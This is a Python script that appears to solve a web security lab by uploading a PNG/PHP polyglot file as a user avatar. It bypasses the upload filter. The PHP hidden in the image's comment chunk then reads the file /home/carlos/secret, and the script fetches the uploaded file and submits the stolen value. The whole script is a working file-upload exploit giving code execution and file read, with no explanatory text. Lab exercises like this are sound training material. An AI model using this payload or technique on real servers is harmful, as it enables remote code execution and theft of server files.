import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
upload_url = burp_url + '/my-account/avatar'
my_acc = burp_url + '/my-account'
read_flag = burp_url + '/files/avatars/polyglot.php'

session = requests.Session()
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)

#file 1
response = session.get(my_acc)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_headers = {"Content-Type": "multipart/form-data; boundary=---------------------------3935431896117889180682821174"}
burp_data = f"-----------------------------3935431896117889180682821174\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"polyglot.php\"\r\nContent-Type: application/octet-stream\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x04gAMA\x00\x00\xb1\x8f\x0b\xfca\x05\x00\x00\x00\tpHYs\x00\x00\x0e\xc3\x00\x00\x0e\xc3\x01\xc7o\xa8d\x00\x00\x00StEXtComment\x00<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>\xd4\xb4`P\x00\x00\x00\rIDAT\x18Wc\xf8\xff\xff\xff\x00\t\xfb\x03\xfd\x05CE\xca\x00\x00\x00\x00IEND\xaeB`\x82\r\n-----------------------------3935431896117889180682821174\r\nContent-Disposition: form-data; name=\"user\"\r\n\r\nwiener\r\n-----------------------------3935431896117889180682821174\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\n{csrf}\r\n-----------------------------3935431896117889180682821174--\r\n"
session.post(upload_url, headers=burp_headers, data=burp_data)

response = session.get(read_flag)
match = re.search(r'START (.*?) END', response.text)
flag = match.group(1)

burp_data = {"answer": flag}
session.post(burp_url+'/submitSolution', data=burp_data)
